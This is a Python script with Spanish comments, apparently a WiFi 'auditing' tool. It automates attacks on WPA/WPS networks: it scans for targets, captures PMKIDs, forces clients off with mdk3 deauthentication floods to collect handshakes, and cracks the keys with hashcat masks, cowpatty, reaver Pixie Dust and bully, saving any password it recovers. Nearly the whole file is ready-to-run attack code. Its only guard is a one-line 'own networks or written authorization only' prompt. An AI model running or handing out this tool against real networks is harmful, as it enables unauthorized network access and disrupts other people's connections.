#!/usr/bin/env python3
"""
wifi_auditor.py - Herramienta principal de auditoría WiFi
Métodos avanzados sin diccionario: PMKID, mdk3, cowpatty, bully, hashcat
"""

import os
import sys
import time
import subprocess
import re
from datetime import datetime

class AdvancedWiFiAuditor:
    def __init__(self, interface="wlan0"):
        self.interface = interface
        self.monitor_interface = None
        self.target_bssid = None
        self.target_essid = None
        self.target_channel = None
        self.output_dir = f"results/audit_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self.pmkid_file = None
        self.handshake_file = None
        self.hash_file = None

        if os.geteuid() != 0:
            print("[!] Se necesitan privilegios de superusuario")
            print("[*] Ejecutar: sudo python3 wifi_auditor.py")
            sys.exit(1)

        self.check_dependencies()

    def check_dependencies(self):
        print("[*] Verificando dependencias...")
        tools = ["airodump-ng", "aireplay-ng", "aircrack-ng", "hcxdumptool",
                 "hcxpcaptool", "mdk3", "hashcat", "bully", "cowpatty"]
        missing = []
        for t in tools:
            try:
                subprocess.run(["which", t], capture_output=True, check=True)
                print(f"  [+] {t} ✓")
            except:
                missing.append(t)
                print(f"  [-] {t} ✗")
        if missing:
            print(f"\n[!] Faltantes: {', '.join(missing)}")
            print("[*] Ejecutar: sudo ./setup.sh")

    def setup_monitor(self):
        print(f"\n[*] Configurando {self.interface} en modo monitor...")
        try:
            subprocess.run(["airmon-ng", "check", "kill"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            result = subprocess.run(["airmon-ng", "start", self.interface],
                                    capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if "(monitor mode)" in line:
                    self.monitor_interface = line.split()[0]
                    break
            if not self.monitor_interface:
                self.monitor_interface = f"{self.interface}mon"
            print(f"[+] Modo monitor: {self.monitor_interface}")
            return True
        except Exception as e:
            print(f"[!] Error: {e}")
            return False

    def scan_networks_advanced(self):
        os.makedirs(self.output_dir, exist_ok=True)
        print("\n[*] Escaneando redes (20s)...")
        proc = subprocess.Popen(
            ["airodump-ng", self.monitor_interface, "-w",
             f"{self.output_dir}/scan", "--output-format", "csv"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(20)
        proc.terminate()
        time.sleep(1)

        networks = []
        try:
            with open(f"{self.output_dir}/scan-01.csv", 'r', errors='ignore') as f:
                content = f.read()
            ap_section = True
            for line in content.split('\n'):
                if "Station MAC" in line:
                    ap_section = False
                    continue
                if ap_section and line.strip():
                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) >= 14 and len(parts[0]) == 17 and ":" in parts[0]:
                        networks.append({
                            'bssid': parts[0],
                            'channel': parts[3] if parts[3] else "?",
                            'privacy': parts[5] if len(parts) > 5 else "",
                            'power': parts[8] if len(parts) > 8 else "?",
                            'essid': parts[13] if len(parts) > 13 else "Hidden"
                        })
        except FileNotFoundError:
            print("[!] No se pudo leer el archivo de escaneo")
            return []

        print("\n" + "="*90)
        print(f"{'#':<3} {'BSSID':<18} {'CH':<4} {'PWR':<5} {'ESSID':<25} {'PRIVACY'}")
        print("-"*90)
        for i, n in enumerate(networks, 1):
            print(f"{i:<3} {n['bssid']:<18} {n['channel']:<4} {n['power']:<5} "
                  f"{n['essid'][:23]:<25} {n['privacy']}")
        print("="*90)
        return networks

    def capture_pmkid(self):
        print(f"\n[*] Capturando PMKID para {self.target_bssid}...")
        os.makedirs(self.output_dir, exist_ok=True)
        target_file = f"{self.output_dir}/target.txt"
        with open(target_file, "w") as f:
            f.write(self.target_bssid)

        pmkid_out = f"{self.output_dir}/pmkid_capture"
        subprocess.run(["iwconfig", self.monitor_interface,
                        "channel", str(self.target_channel)],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        print("[*] Capturando PMKID (60s)...")
        proc = subprocess.Popen(
            ["hcxdumptool", "-i", self.monitor_interface,
             "-o", f"{pmkid_out}.pcapng", "--enable_status=1"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(60)
        proc.terminate()
        time.sleep(2)

        # Convertir a hashcat
        print("[*] Convirtiendo a formato hashcat...")
        subprocess.run(["hcxpcaptool", "-z", f"{self.output_dir}/hash.hc22000",
                        f"{pmkid_out}.pcapng"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        hash_path = f"{self.output_dir}/hash.hc22000"
        if os.path.exists(hash_path) and os.path.getsize(hash_path) > 0:
            self.hash_file = hash_path
            print(f"[+] Hash PMKID guardado: {hash_path}")
            return True
        print("[-] No se capturó PMKID")
        return False

    def capture_handshake_mdk3(self):
        print(f"\n[*] Capturando handshake con mdk3...")
        os.makedirs(self.output_dir, exist_ok=True)
        cap_file = f"{self.output_dir}/mdk3_capture"

        subprocess.run(["iwconfig", self.monitor_interface,
                        "channel", str(self.target_channel)],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        airodump = subprocess.Popen(
            ["airodump-ng", "--bssid", self.target_bssid,
             "-c", str(self.target_channel), "-w", cap_file,
             self.monitor_interface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)

        blacklist = f"{self.output_dir}/blacklist.txt"
        with open(blacklist, "w") as f:
            f.write(self.target_bssid)

        print("[*] Ejecutando mdk3 deauth (30s)...")
        mdk3 = subprocess.Popen(
            ["mdk3", self.monitor_interface, "d",
             "-b", blacklist, "-c", str(self.target_channel)],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(30)
        mdk3.terminate()
        airodump.terminate()
        time.sleep(2)

        self.handshake_file = f"{cap_file}-01.cap"
        if self.verify_handshake(self.handshake_file):
            print("[+] Handshake capturado!")
            return True
        print("[-] No se capturó handshake")
        return False

    def verify_handshake(self, cap_file):
        try:
            r = subprocess.run(["aircrack-ng", cap_file],
                               capture_output=True, text=True)
            return "1 handshake" in r.stdout or "WPA handshake" in r.stdout
        except:
            return False

    def attack_pmkid_hashcat(self):
        if not self.hash_file or not os.path.exists(self.hash_file):
            print("[!] No hay hash PMKID disponible")
            return None

        print("\n" + "="*60)
        print("ATAQUE PMKID CON HASHCAT (fuerza bruta)")
        print("="*60)
        print("1. 8 dígitos           (?d x8)")
        print("2. 10 dígitos          (?d x10)")
        print("3. 8 minúsculas        (?l x8)")
        print("4. 4 letras + 4 dígitos")
        print("5. Máscara personalizada")
        print("6. Usar archivo smart_masks.txt")

        opt = input("\nOpción [1-6]: ").strip()

        masks = {
            "1": ["?d?d?d?d?d?d?d?d"],
            "2": ["?d?d?d?d?d?d?d?d?d?d"],
            "3": ["?l?l?l?l?l?l?l?l"],
            "4": ["?l?l?l?l?d?d?d?d"],
        }

        if opt == "5":
            m = input("Ingrese máscara (ej: ?l?l?d?d?d?d): ").strip()
            mask_list = [m]
        elif opt == "6":
            mask_file = "wordlists/smart_masks.txt"
            if not os.path.exists(mask_file):
                print(f"[!] No existe {mask_file}. Ejecutar smart_masks.py primero")
                return None
            with open(mask_file, 'r') as f:
                mask_list = [l.strip() for l in f if l.strip()]
        elif opt in masks:
            mask_list = masks[opt]
        else:
            print("[!] Opción inválida")
            return None

        for mask in mask_list:
            print(f"\n[*] Probando máscara: {mask}")
            try:
                proc = subprocess.Popen(
                    ["hashcat", "-m", "22000", "-a", "3",
                     self.hash_file, mask, "--force", "-O", "-w", "3"],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, bufsize=1)

                password = None
                for line in proc.stdout:
                    if "Cracked" in line or "Recovered" in line:
                        match = re.search(r'([0-9a-f]{32}):([^\s:]+)', line)
                        if match:
                            password = match.group(2)
                            print(f"\n[+] CONTRASEÑA: {password}")
                            break
                proc.wait()

                if password:
                    self._save_password(password, f"hashcat mask:{mask}")
                    return password

                print(f"[-] Sin resultado para {mask}")
            except KeyboardInterrupt:
                print("\n[*] Interrumpido")
                return None
            except Exception as e:
                print(f"[!] Error: {e}")

        return None

    def attack_handshake_cowpatty(self):
        if not self.handshake_file or not os.path.exists(self.handshake_file):
            print("[!] No hay archivo de handshake")
            return None

        print("\n" + "="*60)
        print("ATAQUE CON COWPATTY")
        print("="*60)

        essid_clean = re.sub(r'[^\w]', '_', self.target_essid)
        rainbow = f"{self.output_dir}/rainbow_{essid_clean}"

        # Buscar wordlist para generar rainbow table
        wordlist = None
        for wl in ["wordlists/rockyou.txt", "/usr/share/wordlists/rockyou.txt"]:
            if os.path.exists(wl):
                wordlist = wl
                break

        if not wordlist:
            print("[!] No se encontró wordlist rockyou.txt")
            print("[*] Descargar: wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt")
            return None

        print(f"[*] Generando rainbow table con {wordlist}...")
        print("[*] Esto puede tomar tiempo...")

        try:
            gen = subprocess.Popen(
                ["genpmk", "-f", wordlist, "-d", rainbow,
                 "-s", self.target_essid],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            for line in gen.stdout:
                print(f"\r[*] {line.strip()[:80]}", end='')
            gen.wait()
            print()

            if not os.path.exists(rainbow):
                print("[!] Falló la generación de rainbow table")
                return None

            print("[*] Atacando con cowpatty...")
            cp = subprocess.run(
                ["cowpatty", "-d", rainbow, "-r", self.handshake_file,
                 "-s", self.target_essid],
                capture_output=True, text=True)

            if "The PSK is" in cp.stdout:
                for line in cp.stdout.split('\n'):
                    if "The PSK is" in line:
                        pw = line.split("'")[1]
                        print(f"\n[+] CONTRASEÑA: {pw}")
                        self._save_password(pw, "cowpatty")
                        return pw

            print("[-] No se encontró contraseña")
            return None
        except FileNotFoundError:
            print("[!] genpmk/cowpatty no instalados")
            print("[*] Instalar: sudo apt-get install cowpatty")
            return None
        except Exception as e:
            print(f"[!] Error: {e}")
            return None

    def attack_bully(self):
        print("\n[*] Ataque con Bully...")
        try:
            subprocess.run(["airmon-ng", "stop", self.monitor_interface],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            proc = subprocess.Popen(
                ["bully", self.interface, "-b", self.target_bssid,
                 "-e", self.target_essid, "-c", str(self.target_channel),
                 "-v", "4", "-F", f"{self.output_dir}/bully_result"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

            for line in proc.stdout:
                print(f"[bully] {line.strip()}")
                if "PSK:" in line or "KEY:" in line:
                    m = re.search(r"['\"]([^'\"]+)['\"]", line)
                    if m:
                        pw = m.group(1)
                        print(f"\n[+] CONTRASEÑA: {pw}")
                        self._save_password(pw, "bully")
                        return pw
            proc.wait()
            return None
        except Exception as e:
            print(f"[!] Error con bully: {e}")
            return None

    def attack_wps_pixie(self):
        print("\n[*] Ataque WPS Pixie Dust...")
        try:
            proc = subprocess.Popen(
                ["reaver", "-i", self.monitor_interface,
                 "-b", self.target_bssid, "-c", str(self.target_channel),
                 "-K", "1", "-vv"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

            start = time.time()
            while time.time() - start < 300:
                line = proc.stdout.readline()
                if not line:
                    time.sleep(1)
                    continue
                print(f"[reaver] {line.strip()}")
                if "WPA PSK:" in line:
                    pw = line.split("WPA PSK:")[1].split()[0].strip("'\"")
                    print(f"\n[+] CONTRASEÑA WPA: {pw}")
                    self._save_password(pw, "WPS Pixie Dust")
                    return pw
            proc.terminate()
            return None
        except FileNotFoundError:
            print("[!] reaver no instalado")
            return None
        except Exception as e:
            print(f"[!] Error: {e}")
            return None

    def _save_password(self, password, method):
        os.makedirs(self.output_dir, exist_ok=True)
        path = f"{self.output_dir}/PASSWORD_FOUND.txt"
        with open(path, "w") as f:
            f.write(f"ESSID: {self.target_essid}\n")
            f.write(f"BSSID: {self.target_bssid}\n")
            f.write(f"Contraseña: {password}\n")
            f.write(f"Método: {method}\n")
            f.write(f"Fecha: {datetime.now()}\n")
        print(f"[+] Resultado guardado en: {path}")

    def cleanup(self):
        print("\n[*] Limpiando...")
        if self.monitor_interface:
            subprocess.run(["airmon-ng", "stop", self.monitor_interface],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ifconfig", self.interface, "up"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("[+] Configuración restaurada")


def main():
    print("="*80)
    print("AUDITORÍA WIFI AVANZADA - MÉTODOS SIN DICCIONARIO")
    print("="*80)
    print("\n⚠️  Solo para redes propias o con autorización escrita\n")

    if input("¿Acepta uso legal? (s/n): ").lower() != 's':
        return

    iface = input("Interfaz WiFi [wlan0]: ").strip() or "wlan0"
    auditor = AdvancedWiFiAuditor(interface=iface)

    try:
        if not auditor.setup_monitor():
            return

        networks = auditor.scan_networks_advanced()
        if not networks:
            return

        try:
            choice = int(input("\nSeleccione red objetivo (0=salir): "))
            if choice == 0:
                return
            if not (1 <= choice <= len(networks)):
                print("[!] Inválido")
                return
            target = networks[choice-1]
            auditor.target_bssid = target['bssid']
            auditor.target_essid = target['essid']
            auditor.target_channel = target['channel'] if target['channel'] != "?" else "1"
            print(f"\n🎯 Target: {auditor.target_essid} ({auditor.target_bssid}) CH={auditor.target_channel}")
        except ValueError:
            print("[!] Entrada inválida")
            return

        print("\n" + "="*60)
        print("MÉTODOS DISPONIBLES:")
        print("="*60)
        print("1. Capturar PMKID")
        print("2. Capturar Handshake (mdk3 deauth)")
        print("3. Atacar PMKID con hashcat")
        print("4. Atacar Handshake con cowpatty")
        print("5. Ataque WPS Pixie Dust (reaver)")
        print("6. Ataque con Bully")
        print("7. Flujo completo automático")
        print("0. Salir")

        opt = input("\nOpción: ").strip()

        password = None
        if opt == "1":
            auditor.capture_pmkid()
        elif opt == "2":
            auditor.capture_handshake_mdk3()
        elif opt == "3":
            password = auditor.attack_pmkid_hashcat()
        elif opt == "4":
            password = auditor.attack_handshake_cowpatty()
        elif opt == "5":
            password = auditor.attack_wps_pixie()
        elif opt == "6":
            password = auditor.attack_bully()
        elif opt == "7":
            print("\n[FLUJO COMPLETO]")
            if auditor.capture_pmkid():
                password = auditor.attack_pmkid_hashcat()
            if not password and auditor.capture_handshake_mdk3():
                password = auditor.attack_handshake_cowpatty()

        if password:
            print("\n" + "="*60)
            print(f"🎉 CONTRASEÑA: {password}")
            print("="*60)

        print(f"\n[*] Resultados en: {auditor.output_dir}")

    except KeyboardInterrupt:
        print("\n[*] Interrumpido")
    finally:
        auditor.cleanup()


if __name__ == "__main__":
    main()